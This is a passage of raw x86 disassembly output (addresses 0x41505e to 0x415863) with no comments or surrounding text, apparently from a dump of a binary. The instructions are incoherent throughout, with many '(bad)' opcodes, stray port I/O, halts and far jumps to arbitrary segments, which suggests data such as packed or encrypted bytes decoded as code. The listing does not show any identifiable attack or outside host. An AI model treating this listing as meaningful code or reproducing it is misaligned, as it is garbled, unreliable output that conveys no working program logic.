  41505e:	and    esi,DWORD PTR [ebp+0x35]
  415061:	out    dx,al
  415062:	and    BYTE PTR [ebp+0x7015bc78],bh
  415068:	movd   mm2,ebp
  41506b:	jnp    0x415001
  41506d:	pop    ebx
  41506e:	lods   al,BYTE PTR ds:[esi]
  41506f:	dec    eax
  415070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415071:	xchg   BYTE PTR [eax+ecx*4+0x3a],dh
  415075:	adc    ebx,esi
  415077:	fdivr  DWORD PTR [edx+0x1f7f667f]
  41507d:	imul   eax,eax,0x29
  415080:	mov    edx,0x1614427b
  415085:	enter  0xff7f,0xf6
  415089:	stos   BYTE PTR es:[edi],al
  41508a:	push   ss
  41508b:	or     al,0x64
  41508d:	addr16 retf 0x83ef
  415091:	out    0x8,eax
  415093:	dec    edi
  415094:	xor    ch,BYTE PTR [edi+0x24]
  415097:	xor    al,0x4b
  415099:	pop    edx
  41509a:	scas   al,BYTE PTR es:[edi]
  41509b:	retf   
  41509c:	jns    0x4150cc
  41509e:	cmp    eax,0x48a8133
  4150a3:	lods   eax,DWORD PTR ds:[esi]
  4150a4:	pop    es
  4150a5:	sub    BYTE PTR [esi],cl
  4150a7:	adc    eax,0xa4672bf9
  4150ac:	or     al,0x4d
  4150ae:	jl     0x4150dc
  4150b0:	les    ecx,FWORD PTR [edi]
  4150b2:	aaa    
  4150b3:	(bad)  
  4150b4:	aam    0x86
  4150b6:	inc    eax
  4150b7:	jecxz  0x415051
  4150b9:	mov    edx,0xf6f6a332
  4150be:	sbb    al,0xee
  4150c1:	pop    esi
  4150c2:	mov    bh,BYTE PTR [esi-0x1d]
  4150c5:	gs std 
  4150c7:	es movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4150ca:	fadd   QWORD PTR [esi]
  4150cc:	test   DWORD PTR ds:0x6a1e3998,edx
  4150d2:	(bad)
  4150d6:	or     DWORD PTR [edx-0x6aa6f152],edx
  4150dc:	repz iret 
  4150de:	mov    ebp,esp
  4150e0:	jae    0x4150ba
  4150e2:	or     DWORD PTR [eax-0x4d],0x22f4bfa9
  4150e9:	mov    bh,0xfc
  4150eb:	pusha  
  4150ec:	es hlt 
  4150ee:	lods   al,BYTE PTR ds:[esi]
  4150ef:	lods   al,BYTE PTR ds:[esi]
  4150f0:	fst    QWORD PTR [esi+0x69]
  4150f3:	sub    BYTE PTR [eax-0x3a149d5b],ch
  4150f9:	ins    BYTE PTR es:[edi],dx
  4150fa:	push   cs
  4150fb:	or     ah,0x42
  4150fe:	inc    ecx
  4150ff:	jns    0x41517f
  415101:	shl    BYTE PTR ds:0xae63d2c,1
  415107:	dec    DWORD PTR [esi]
  415109:	lock lahf 
  41510b:	lods   al,BYTE PTR ds:[esi]
  41510c:	sahf   
  41510d:	pop    ds
  41510e:	push   ecx
  41510f:	pop    edx
  415110:	aad    0xef
  415112:	pop    ds
  415113:	inc    ebp
  415114:	arpl   WORD PTR [ebp-0x2bf8462f],si
  41511a:	push   esi
  41511b:	lahf   
  41511c:	jmp    0xfcfe:0xd970ab67
  415123:	(bad)
  415128:	xchg   ebx,eax
  415129:	jb     0x4150ca
  41512b:	cwde   
  41512c:	add    ecx,DWORD PTR [edi]
  41512e:	sub    eax,0x93ea4cef
  415133:	mov    esp,0x7d447151
  415138:	jmp    0xfcdf:0x2e351b83
  41513f:	xor    dh,BYTE PTR [edi+eax*2-0x7a]
  415143:	das    
  415144:	gs out dx,al
  415146:	(bad)  
  415147:	(bad)  
  415148:	mov    al,0xe5
  41514a:	or     BYTE PTR [esp+edx*8-0x15],cl
  41514e:	jmp    0x4df5a015
  415153:	dec    edx
  415154:	jmp    0x415147
  415156:	push   edx
  415157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415158:	pop    edi
  415159:	jnp    0x4150ff
  41515b:	fisub  WORD PTR [edx]
  41515d:	add    DWORD PTR [ebx],0x46f6ad77
  415163:	inc    ecx
  415164:	out    0x40,al
  415166:	adc    al,0x72
  415168:	pop    edi
  415169:	mov    ebx,0xedc63b7c
  41516e:	add    eax,0x4980358e
  415173:	xor    DWORD PTR [ecx-0x32],0x9f0c0abd
  41517a:	fwait
  41517b:	iret   
  41517c:	mov    edi,0x74a9129f
  415181:	sbb    DWORD PTR [eax],ebx
  415183:	arpl   WORD PTR [ecx-0x5cca60c0],cx
  415189:	and    eax,0x2a8b283e
  41518e:	cli    
  41518f:	mov    edx,0x6aff7abf
  415194:	cdq    
  415195:	cwde   
  415196:	test   BYTE PTR [esi],al
  415198:	pushf  
  415199:	push   eax
  41519a:	test   BYTE PTR [edx+0x41],bh
  41519d:	push   0xe889bfec
  4151a2:	and    al,0xda
  4151a4:	jmp    0x41517e
  4151a6:	cmp    eax,0xb92ad34e
  4151ab:	push   ecx
  4151ac:	jg     0x415147
  4151ae:	mov    es,esi
  4151b0:	push   eax
  4151b1:	and    BYTE PTR [eax],bl
  4151b3:	comiss xmm5,xmm6
  4151b6:	mov    ebp,0x1d0b7953
  4151bb:	test   BYTE PTR [esi],ah
  4151bd:	retf   
  4151be:	add    eax,0x62d83dd
  4151c3:	enter  0x5a86,0x3c
  4151c7:	cmp    dl,0x72
  4151ca:	or     dh,BYTE PTR ds:0xf4e60c31
  4151d0:	and    edx,DWORD PTR [eax]
  4151d2:	scas   al,BYTE PTR es:[edi]
  4151d3:	mov    eax,ds:0x6e62e4fc
  4151d8:	mov    eax,0xbd4d8796
  4151dd:	repz fcmovnb st,st(5)
  4151e0:	cmp    eax,0x9c007be5
  4151e5:	cld    
  4151e6:	sti    
  4151e7:	sti    
  4151e8:	mov    esi,0xbeaa99ab
  4151ed:	jbe    0x4151d3
  4151ef:	cmp    bh,BYTE PTR [eax]
  4151f1:	add    dh,dh
  4151f3:	fidivr DWORD PTR [eax+esi*1+0x1e]
  4151f7:	ins    DWORD PTR es:[edi],dx
  4151f8:	jmp    0xbfbfe0b0
  4151fd:	(bad)  
  4151ff:	sbb    esi,DWORD PTR [eax+0x622e72ff]
  415205:	or     al,0x91
  415207:	mov    cl,0x36
  415209:	lods   eax,DWORD PTR ds:[esi]
  41520a:	pop    esp
  41520b:	mov    ecx,0xf7460a56
  415210:	lea    eax,[ebp+0x45]
  415213:	sbb    BYTE PTR [ebx-0x4a05bc2b],dh
  415219:	rcr    DWORD PTR ds:0xed27e230,cl
  41521f:	jmp    edi
  415221:	popa   
  415222:	mov    dh,0x97
  415224:	mov    gs,WORD PTR [edi-0x34]
  415227:	push   ss
  415228:	ds jge 0x415261
  41522b:	mov    ebx,0xaccd551a
  415230:	push   ss
  415231:	mov    BYTE PTR [ebx-0x61635c28],ch
  415237:	fucomp st(6)
  415239:	clc    
  41523a:	xchg   DWORD PTR [edx+0x1ce8a436],esp
  415240:	nop
  415241:	push   0xfffffff3
  415243:	sbb    eax,0x62e4ee0e
  415248:	xchg   BYTE PTR [esi-0x9],bh
  41524b:	sbb    ecx,DWORD PTR [ecx-0x14734be3]
  415251:	aas    
  415252:	cmp    dl,dh
  415254:	or     dh,dl
  415256:	sub    BYTE PTR [ecx-0x3f286bf4],0x3d
  41525d:	bound  esi,QWORD PTR [ecx+0x77]
  415260:	jg     0x4151e6
  415262:	pop    es
  415263:	add    BYTE PTR [edi+0x2e],bh
  415266:	jae    0x4151ec
  415268:	sub    BYTE PTR [esi+0x17],dl
  41526b:	cwde   
  41526c:	in     eax,0x55
  41526e:	in     eax,dx
  41526f:	push   esp
  415270:	(bad)  
  415271:	enter  0x7f0b,0x5e
  415275:	repz pop edi
  415277:	rcl    DWORD PTR ds:0xdf899657,0x2e
  41527e:	ret    
  41527f:	les    ebx,FWORD PTR ds:0x8c658dbd
  415285:	jb     0x41527b
  415287:	add    al,0xed
  41528a:	xor    al,0x9a
  41528c:	and    al,0x87
  41528e:	push   edx
  41528f:	call   DWORD PTR [bp+di+0x4b6a]
  415294:	scas   al,BYTE PTR es:[edi]
  415295:	fstp   st(2)
  415297:	stos   BYTE PTR es:[edi],al
  415298:	push   ds
  415299:	aad    0x31
  41529b:	xor    al,0xa
  41529d:	jecxz  0x4152e2
  41529f:	add    edi,DWORD PTR [edx]
  4152a1:	pushf  
  4152a2:	cwde   
  4152a3:	mov    BYTE PTR [ecx-0x76],bh
  4152a6:	mov    edi,0x737d8ce7
  4152ab:	cmp    al,0x99
  4152ad:	cmp    esp,ecx
  4152af:	jns    0x415289
  4152b1:	add    esp,0x63
  4152b4:	mov    al,cl
  4152b6:	inc    ecx
  4152b7:	test   eax,0xdc8dd5fe
  4152bc:	sub    bl,0xff
  4152bf:	popf   
  4152c0:	ins    DWORD PTR es:[edi],dx
  4152c1:	lea    ebx,[edi]
  4152c3:	daa    
  4152c4:	xor    al,0x35
  4152c6:	jns    0x41524c
  4152c8:	add    al,0xa4
  4152ca:	add    al,0xc1
  4152cc:	fisubr WORD PTR [ebx]
  4152cf:	sbb    bl,BYTE PTR [ecx+0x65fb0fd2]
  4152d5:	(bad)  
  4152d6:	aad    0xff
  4152d8:	jbe    0x4152e7
  4152da:	es cld 
  4152dc:	adc    eax,0x9e5f2904
  4152e1:	mov    dl,0x72
  4152e3:	mov    al,0xb3
  4152e5:	sar    BYTE PTR ds:0xb5a93775,0x47
  4152ec:	jg     0x415297
  4152ee:	sbb    edx,DWORD PTR [ebx+0x7]
  4152f1:	in     al,0xf8
  4152f3:	mov    edi,0x564d09ae
  4152f8:	popaw  
  4152fa:	lea    esi,[edx+0x38]
  4152fd:	inc    edx
  4152fe:	cmp    edx,DWORD PTR [eax-0x4019972]
  415304:	(bad)  
  415305:	test   eax,0x16526766
  41530a:	imul   DWORD PTR [edx-0x66]
  41530d:	mov    bh,0x4
  41530f:	ffreep st(4)
  415311:	add    esp,DWORD PTR [eax-0x3292d0fd]
  415317:	das    
  415318:	xlat   BYTE PTR ds:[ebx]
  415319:	lahf   
  41531a:	sub    al,0xb9
  41531c:	add    eax,DWORD PTR [esi+eiz*4-0x31664ef0]
  415323:	std    
  415324:	jg     0x4152d8
  415326:	jge    0x4152de
  415328:	fdivr  QWORD PTR [ebp-0x24d18e38]
  41532e:	adc    bl,BYTE PTR [eax]
  415330:	jnp    0x415349
  415332:	dec    ebx
  415333:	jmp    0x8819:0xe7807650
  41533a:	inc    esp
  41533b:	(bad)  
  41533c:	out    dx,eax
  41533d:	xchg   edi,eax
  41533e:	mov    bl,0xa5
  415340:	push   ss
  415341:	jne    0x4153c2
  415343:	jg     0x4153b3
  415345:	mov    esp,0x81d2dd90
  41534a:	push   ds
  41534b:	jmp    0x322:0xfa27c1c7
  415352:	cwde   
  415353:	inc    ecx
  415354:	xchg   BYTE PTR [edi],dh
  415356:	dec    ecx
  415357:	fwait
  415358:	add    al,0x87
  41535a:	push   edx
  41535b:	sbb    dl,bh
  41535d:	sbb    eax,0x73
  415360:	fcmovne st,st(4)
  415362:	inc    edx
  415363:	in     eax,0x15
  415365:	gs repz mov esi,0x7ec302d
  41536c:	jge    0x4153ea
  41536e:	cmp    cl,BYTE PTR ds:0xd0cfc8ae
  415374:	cmp    eax,0x108db0dc
  415379:	adc    ch,cl
  41537b:	mov    esi,0x95fde526
  415380:	inc    ecx
  415381:	test   al,0x83
  415383:	pop    es
  415384:	std    
  415385:	mov    al,ds:0xfaa9372b
  41538a:	sbb    BYTE PTR [esi+ecx*8-0x24686853],0x9d
  415392:	cs mov ch,0xac
  415395:	sbb    cl,bh
  415397:	js     0x4153bb
  415399:	push   ebx
  41539a:	or     al,0x5c
  41539c:	(bad)  
  41539d:	cli    
  41539e:	mov    bl,0x39
  4153a0:	or     bl,BYTE PTR [esi-0x3a]
  4153a3:	sub    ebp,esp
  4153a5:	cwde   
  4153a6:	and    eax,0x585cd1fe
  4153ab:	mov    ebx,0x74268030
  4153b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b1:	adc    DWORD PTR [esi+0x66390a7d],0x5978d280
  4153bb:	cmp    DWORD PTR [eax],edi
  4153bd:	push   edi
  4153be:	and    al,0xc9
  4153c0:	pop    ss
  4153c1:	add    esi,DWORD PTR [ecx+ebp*2+0x46]
  4153c5:	cmp    DWORD PTR [esi+0x71],esi
  4153c8:	push   ss
  4153c9:	jge    0x41534c
  4153cb:	add    ah,bh
  4153cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ce:	push   edx
  4153cf:	cmp    eax,0x7cbccb45
  4153d4:	icebp  
  4153d5:	outs   dx,BYTE PTR ds:[esi]
  4153d6:	pop    ebp
  4153d7:	mov    dl,0x89
  4153d9:	mov    eax,ds:0x1e5be9ad
  4153de:	pushf  
  4153df:	add    al,0x5d
  4153e1:	pop    ss
  4153e2:	mov    ?,WORD PTR [eax-0x50]
  4153e5:	add    edx,DWORD PTR [edi+0x632190fb]
  4153eb:	inc    ebx
  4153ec:	cmp    DWORD PTR [ebp+0x5c842833],0xffffffd3
  4153f3:	inc    esi
  4153f4:	jb     0x4153d4
  4153f6:	adc    dh,BYTE PTR [ebx+0x49]
  4153f9:	mov    al,es:0x6d455e52
  4153ff:	jae    0x4153ae
  415401:	shl    BYTE PTR [edx],0x90
  415404:	std    
  415405:	sbb    bh,ah
  415407:	mov    esi,0xf8214aa6
  41540c:	dec    edi
  41540d:	popf   
  41540e:	xor    DWORD PTR [edi-0x2886326f],edx
  415414:	or     al,0xa7
  415416:	push   0x33c1628b
  41541b:	xchg   ebp,eax
  41541c:	mov    bh,bl
  41541e:	mov    al,0x29
  415420:	(bad)  
  415421:	mov    cs,WORD PTR [eax+0x23ca950]
  415427:	or     ebx,ebp
  415429:	retf   0x10c5
  41542c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41542d:	mov    dh,0x30
  41542f:	or     al,0x7b
  415431:	add    BYTE PTR [edi+0xdbebd79],dh
  415437:	popa   
  415438:	add    DWORD PTR [edi-0xd],0x4d
  41543c:	loope  0x415433
  41543e:	jns    0x4153c7
  415440:	rcr    BYTE PTR [edi],1
  415442:	sbb    al,0xd5
  415444:	les    ebp,FWORD PTR [edx-0x43]
  415447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415448:	sbb    al,0xf
  41544a:	adc    DWORD PTR [ebx+0x24],0xd7f889fa
  415451:	repz mov WORD PTR [edx],es
  415454:	sub    BYTE PTR [ecx+0x60bbbc61],bl
  41545a:	mov    ds:0x4dba67e5,al
  41545f:	pusha  
  415460:	fs jge 0x415447
  415463:	clc    
  415464:	push   ebp
  415465:	call   0xff94:0x1d149fb
  41546c:	pop    ecx
  41546d:	ds dec ebp
  41546f:	icebp  
  415470:	push   ebx
  415471:	mov    ds:0xff9b48d6,eax
  415476:	sub    edx,DWORD PTR [esi+ebp*4-0x65]
  41547a:	(bad)  
  41547b:	fisubr DWORD PTR [edx+0x7bf8da1d]
  415481:	add    DWORD PTR [esi+0x6adb5063],0xbaf29f11
  41548b:	and    al,0x69
  41548d:	dec    esp
  41548e:	imul   ebp,DWORD PTR [ebx],0x1ea28eb0
  415494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415495:	iret   
  415496:	jns    0x415447
  415498:	jl     0x415446
  41549a:	and    BYTE PTR [edx],dl
  41549c:	and    eax,0x23274acc
  4154a1:	mov    cl,0x0
  4154a3:	push   0x7cc67719
  4154a8:	daa    
  4154a9:	adc    esp,esi
  4154ab:	je     0x41544c
  4154ad:	or     eax,0x7492954a
  4154b2:	mov    ds:0xf8fbe33,eax
  4154b7:	cdq    
  4154b8:	xor    DWORD PTR [eax],ebp
  4154ba:	hlt    
  4154bb:	inc    esp
  4154bc:	mov    edi,0xaefb8382
  4154c1:	stos   BYTE PTR es:[edi],al
  4154c2:	sub    DWORD PTR [esi-0x3add6ee],edx
  4154c8:	sahf   
  4154c9:	or     BYTE PTR [esp+eax*4],0x6d
  4154cd:	fisubr DWORD PTR [ebp+0x73876d8]
  4154d3:	repnz mov bh,al
  4154d6:	shl    WORD PTR [ebx-0x25],cl
  4154da:	push   0x279725f9
  4154df:	arpl   WORD PTR [edx+0x6c0cd6fa],sp
  4154e5:	inc    ecx
  4154e6:	xchg   edi,eax
  4154e7:	push   esp
  4154e8:	(bad)  
  4154e9:	pop    ss
  4154ea:	push   ds
  4154eb:	fnstcw WORD PTR [edi-0x62]
  4154ee:	xchg   esi,eax
  4154ef:	nop
  4154f0:	pusha  
  4154f1:	xchg   al,bh
  4154f3:	(bad)  
  4154f4:	jmp    FWORD PTR [esp+ecx*2-0x64]
  4154f8:	pushf  
  4154f9:	mov    ds:0x42c08e69,al
  4154fe:	(bad)  
  4154ff:	cmp    DWORD PTR [ebp-0x7778fbda],eax
  415505:	and    al,0x62
  415507:	imul   edx,DWORD PTR ds:0x2bb67e98,0x7f8e8199
  415511:	lea    edx,[esi-0x42a27710]
  415517:	mov    dh,0xdf
  415519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41551a:	outs   dx,DWORD PTR ds:[esi]
  41551b:	mov    cl,0x71
  41551d:	dec    ecx
  41551e:	and    eax,0x6f4b62d
  415523:	or     al,0x88
  415525:	mov    ds:0xa66a109f,al
  41552a:	add    bl,BYTE PTR [edx+0x2fcdc067]
  415530:	xor    al,0x75
  415532:	mov    al,ds:0xe182849d
  415537:	daa    
  415538:	sbb    ecx,esi
  41553a:	pop    ecx
  41553b:	jecxz  0x41558b
  41553d:	cmp    BYTE PTR [ecx],cl
  41553f:	dec    edx
  415540:	lock adc DWORD PTR fs:[eax+esi*1-0x72],ebp
  415546:	das    
  415547:	fidivr WORD PTR [ecx-0x62]
  41554a:	gs aad 0xbb
  41554d:	in     eax,0xbf
  41554f:	ss xchg esp,eax
  415551:	fistp  DWORD PTR [ebx-0x3b]
  415554:	test   eax,0x413fb0dd
  415559:	shl    BYTE PTR [esi+0x6b57ff2f],1
  41555f:	push   edi
  415560:	popf   
  415561:	stc    
  415562:	fwait
  415563:	ror    DWORD PTR [ecx],cl
  415565:	sub    al,0xb7
  415567:	add    dl,dl
  415569:	xor    dl,BYTE PTR [ebx+0x51]
  41556c:	add    DWORD PTR [esi],0xa02373ea
  415572:	ficomp WORD PTR [edx+0x2d]
  415575:	(bad)  
  415576:	rcl    BYTE PTR [edi-0x62b47469],1
  41557c:	mov    edi,0x8146109d
  415581:	mov    esi,0xd5438e34
  415586:	and    ecx,eax
  415588:	jle    0x415542
  41558a:	push   ebp
  41558b:	sub    BYTE PTR [ecx-0x35],0x1c
  41558f:	xchg   esp,eax
  415590:	ret    
  415591:	dec    esi
  415592:	data16 jge 0x4155d5
  415595:	hlt    
  415596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415597:	stc    
  415598:	or     DWORD PTR [ebp-0x42],0x32
  41559c:	dec    eax
  41559d:	mov    eax,DWORD PTR [edx+0x79]
  4155a0:	add    ebx,DWORD PTR [ebp+0x2b]
  4155a3:	das    
  4155a4:	in     al,dx
  4155a5:	xchg   ecx,eax
  4155a6:	sub    eax,ebx
  4155a8:	mov    edi,0x660338d4
  4155ad:	mov    ebx,DWORD PTR [ebx+0x2526d4b3]
  4155b3:	cs jo  0x41557d
  4155b6:	(bad)  [eax]
  4155b8:	jb     0x415635
  4155ba:	stc    
  4155bb:	dec    eax
  4155bc:	loopne 0x4155c0
  4155be:	scas   al,BYTE PTR es:[edi]
  4155bf:	push   cs
  4155c0:	mov    cl,0x56
  4155c2:	stos   BYTE PTR es:[edi],al
  4155c3:	jmp    0xbc8ea7ae
  4155c8:	jo     0x4155a4
  4155ca:	mov    ch,0x1c
  4155cc:	test   al,0x91
  4155ce:	cli    
  4155cf:	jge    0x415556
  4155d1:	and    dl,ah
  4155d3:	jnp    0x4155a8
  4155d5:	dec    ebx
  4155d6:	sbb    eax,0x5aacbacf
  4155db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155dc:	mov    bl,0x43
  4155de:	out    dx,al
  4155df:	rcr    DWORD PTR [ecx],cl
  4155e1:	pop    ecx
  4155e2:	jb     0x415572
  4155e4:	ret    0x67c7
  4155e7:	cmp    DWORD PTR [ebp+0x35],ecx
  4155ea:	mov    dh,0x9d
  4155ec:	adc    eax,0x773789bd
  4155f1:	sbb    bl,dh
  4155f3:	push   edx
  4155f4:	(bad)
  4155f7:	pop    esp
  4155f8:	sub    BYTE PTR [ebx],ch
  4155fa:	jbe    0x415638
  4155fc:	pop    es
  4155fd:	test   BYTE PTR [edx],al
  4155ff:	mov    ds:0x3ae560a8,eax
  415604:	add    al,0x70
  415606:	div    BYTE PTR [ecx+0x25]
  415609:	enter  0x1a84,0x7c
  41560d:	adc    ch,bh
  41560f:	push   0x262f88b2
  415614:	dec    ecx
  415615:	add    BYTE PTR [esi-0x43894f1b],ah
  41561b:	pop    esp
  41561c:	jb     0x415616
  41561e:	jl     0x41568d
  415620:	fmul   QWORD PTR [eax]
  415622:	add    al,0x85
  415624:	test   al,0x7b
  415626:	imul   ebx,DWORD PTR [ebx+0xfc83db9],0x8e1bbfb0
  415630:	outs   dx,DWORD PTR ds:[esi]
  415631:	out    dx,eax
  415632:	bound  edx,QWORD PTR [ebx]
  415634:	mov    ebp,0xd53849b0
  415639:	rcl    DWORD PTR cs:[esi+0x653b613d],cl
  415640:	sti    
  415641:	adc    esp,edi
  415643:	xor    eax,0x84437818
  415648:	mov    bl,0xfa
  41564a:	mov    edi,DWORD PTR [edi]
  41564c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41564e:	jns    0x41567a
  415650:	adc    eax,0x6cc644d1
  415655:	mov    cl,0x2c
  415657:	xchg   esi,eax
  415658:	fistp  WORD PTR [ecx+0x51]
  41565b:	rcl    esi,cl
  41565d:	sbb    BYTE PTR [edx+0x6a],dl
  415660:	shl    esp,0x6d
  415663:	loop   0x4156a7
  415665:	sti    
  415666:	xchg   ebx,eax
  415667:	or     edx,DWORD PTR gs:[edi+edx*8]
  41566b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566c:	dec    ecx
  41566d:	dec    esp
  41566e:	and    BYTE PTR [edi+0x72891e0d],0x83
  415675:	out    dx,al
  415676:	dec    ebp
  415677:	push   ebp
  415678:	mov    ah,0xc7
  41567a:	stc    
  41567b:	mov    ds:0x6b1d9123,eax
  415680:	or     DWORD PTR [edx-0x7bf1a9dc],0x6e06d66d
  41568a:	call   0x74990deb
  41568f:	jmp    0xdc06:0x40de203c
  415696:	sbb    BYTE PTR [esi],0xe4
  415699:	dec    eax
  41569a:	dec    eax
  41569b:	out    dx,al
  41569c:	dec    ecx
  41569d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569f:	xor    al,0x9f
  4156a1:	mov    ch,0x80
  4156a3:	jl     0x41571e
  4156a5:	pop    ss
  4156a6:	daa    
  4156a7:	mov    ds:0xffcfd1a,al
  4156ac:	test   DWORD PTR [eax-0x6c],edx
  4156af:	adc    DWORD PTR [edi-0x17],edx
  4156b2:	stc    
  4156b3:	js     0x41572d
  4156b5:	fistp  DWORD PTR [edi+0x2a4050ae]
  4156bb:	add    eax,0xf8783def
  4156c0:	sbb    BYTE PTR [ebx+0x6f],al
  4156c3:	(bad)  
  4156c4:	outs   dx,DWORD PTR ds:[esi]
  4156c5:	mov    eax,0x95469fd5
  4156ca:	lahf   
  4156cb:	fstp   DWORD PTR [edx-0x62]
  4156ce:	fs cdq 
  4156d0:	mov    ds:0xab0cae2d,al
  4156d5:	adc    eax,0x10a4c759
  4156da:	mov    bh,ch
  4156dc:	test   al,bh
  4156de:	mov    cl,0x86
  4156e0:	or     esp,DWORD PTR [eax+0x69f08bd3]
  4156e6:	xchg   ebx,eax
  4156e7:	mov    bl,0x70
  4156e9:	or     eax,0x4d27d64
  4156ee:	or     al,0x48
  4156f0:	iret   
  4156f1:	sbb    ebp,DWORD PTR [esi]
  4156f3:	xchg   ebx,eax
  4156f4:	stos   BYTE PTR es:[edi],al
  4156f5:	jo     0x41568a
  4156f7:	xor    edi,DWORD PTR [ebp+0x3301a111]
  4156fd:	and    al,0x86
  4156ff:	add    dl,al
  415701:	jmp    0x7782326f
  415706:	out    dx,eax
  415707:	outs   dx,BYTE PTR ds:[esi]
  415708:	jecxz  0x41569e
  41570a:	xchg   ebp,eax
  41570b:	call   0xdd7c:0x5993a2b6
  415712:	add    ebx,eax
  415714:	push   ds
  415715:	inc    ecx
  415716:	cld    
  415717:	into   
  415718:	rcl    BYTE PTR [ebx],0x51
  41571b:	sub    eax,0x9e0efee
  415720:	xor    edx,edi
  415722:	cmp    ecx,0xf6880390
  415728:	jl     0x415750
  41572a:	ss std 
  41572c:	ds (bad) 
  41572e:	or     ebp,edi
  415730:	xor    DWORD PTR [ebx-0x44],esi
  415733:	out    dx,al
  415734:	imul   ecx,DWORD PTR [ebx+esi*2-0x47],0x55ad753f
  41573c:	cdq    
  41573d:	pop    ebp
  41573e:	cmp    dl,bh
  415740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415741:	mov    esp,0x332a34cc
  415746:	test   al,0x11
  415748:	pop    ebp
  415749:	xlat   BYTE PTR ds:[ebx]
  41574a:	jg     0x415760
  41574c:	repz mov dh,0x53
  41574f:	dec    edi
  415750:	lahf   
  415751:	jle    0x41573b
  415753:	sub    al,0xae
  415755:	sbb    bl,BYTE PTR [edi]
  415757:	test   eax,0x48c8223c
  41575c:	fs xchg ebp,eax
  41575e:	mov    esp,0xc680772d
  415763:	retf   0x64c0
  415766:	xor    eax,0x245d3428
  41576b:	adc    BYTE PTR [edx-0x39a02f6a],ch
  415771:	cdq    
  415772:	test   BYTE PTR [edx-0x18],dh
  415775:	lahf   
  415776:	sbb    BYTE PTR [eax+0x69],bl
  415779:	xor    ecx,edx
  41577b:	sub    DWORD PTR [ebx+0x16],eax
  41577e:	dec    ecx
  41577f:	adc    ecx,esi
  415781:	xchg   ebp,eax
  415782:	in     al,dx
  415783:	inc    esi
  415784:	sbb    DWORD PTR [esi-0x77],edx
  415787:	pushf  
  415788:	mov    eax,0xe208ab24
  41578d:	jo     0x4157ef
  41578f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415790:	fcomp  DWORD PTR [edi]
  415792:	mov    bl,0x90
  415794:	retf   
  415795:	and    BYTE PTR [edx],dl
  415797:	je     0x415783
  415799:	pop    ebp
  41579a:	test   BYTE PTR [ebx-0x7e7a9959],0xd3
  4157a1:	fimul  DWORD PTR [edi+0x1de14bbc]
  4157a7:	and    BYTE PTR [edi+0x70b3a33f],0x47
  4157ae:	cmp    esp,ecx
  4157b0:	out    dx,al
  4157b1:	pop    es
  4157b2:	in     al,0xa8
  4157b4:	push   edx
  4157b5:	push   esi
  4157b6:	cli    
  4157b7:	dec    BYTE PTR [ecx]
  4157b9:	inc    edx
  4157ba:	(bad)  
  4157bb:	(bad)  
  4157bc:	cld    
  4157bd:	xor    DWORD PTR [ecx+0x74],edi
  4157c0:	jno    0x415804
  4157c2:	js     0x41576c
  4157c4:	loop   0x415767
  4157c6:	leave  
  4157c7:	or     DWORD PTR [ecx-0x50],0x3
  4157cb:	xlat   BYTE PTR ds:[ebx]
  4157cc:	mov    ds:0x422e3c63,eax
  4157d1:	sar    BYTE PTR [ebx+0x7d],1
  4157d4:	xchg   ebx,eax
  4157d5:	dec    ebx
  4157d6:	dec    edi
  4157d7:	ins    BYTE PTR es:[edi],dx
  4157d8:	scas   eax,DWORD PTR es:[edi]
  4157d9:	test   edi,edi
  4157db:	pop    eax
  4157dc:	adc    ebp,0x77
  4157df:	lds    esi,FWORD PTR [edi-0x6702b928]
  4157e5:	sub    al,0xd9
  4157e7:	adc    ah,BYTE PTR [edi]
  4157e9:	lea    ecx,[edx]
  4157eb:	rcl    BYTE PTR [edi+0xf],1
  4157ee:	outs   dx,BYTE PTR ds:[esi]
  4157ef:	dec    esp
  4157f0:	popf   
  4157f1:	jae    0x41585d
  4157f3:	sub    al,0x17
  4157f5:	clc    
  4157f6:	dec    eax
  4157f7:	or     DWORD PTR [ebp+0x1b],0xffffffce
  4157fb:	icebp  
  4157fc:	popa   
  4157fd:	adc    al,0x33
  4157ff:	mov    eax,ds:0x36bcaa5a
  415804:	mov    esi,0x673d92aa
  415809:	xor    eax,ecx
  41580b:	enter  0xd425,0xab
  41580f:	sbb    eax,0x4913924d
  415814:	jb     0x4157c0
  415816:	xchg   ebx,eax
  415817:	sub    DWORD PTR [edi-0x1e],eax
  41581a:	not    DWORD PTR [ebx]
  41581c:	inc    esp
  41581d:	xchg   edi,eax
  41581e:	cmp    eax,0x53fd9998
  415823:	lds    edi,FWORD PTR [eax+0x3e]
  415826:	mov    cl,0xf2
  415828:	xor    al,cl
  41582a:	xchg   DWORD PTR [edi-0x3],edi
  41582d:	push   ecx
  41582e:	ret    
  41582f:	fucomip st,st(4)
  415831:	and    eax,0x9c9bfdf6
  415836:	fwait
  415837:	xchg   esi,eax
  415838:	stc    
  415839:	pop    eax
  41583a:	cmp    DWORD PTR [edi-0x57],eax
  41583d:	inc    ebx
  41583e:	add    cl,BYTE PTR [edi]
  415840:	in     al,dx
  415841:	outs   dx,BYTE PTR ds:[esi]
  415842:	mov    esi,0x1db0fa3c
  415847:	add    DWORD PTR [edx+ebx*1],ebx
  41584a:	cld    
  41584b:	mov    BYTE PTR [esi],0x3b
  41584e:	iret   
  41584f:	pushf  
  415850:	ret    
  415851:	stos   DWORD PTR es:[edi],eax
  415852:	fstp   st(4)
  415854:	sub    bl,dl
  415856:	sbb    ah,BYTE PTR [ebp-0x24]
  415859:	cmc    
  41585a:	sub    esi,DWORD PTR [ebx]
  41585c:	or     edi,edi
  41585e:	mov    ds:0xff1605a8,eax
  415863:	hlt    
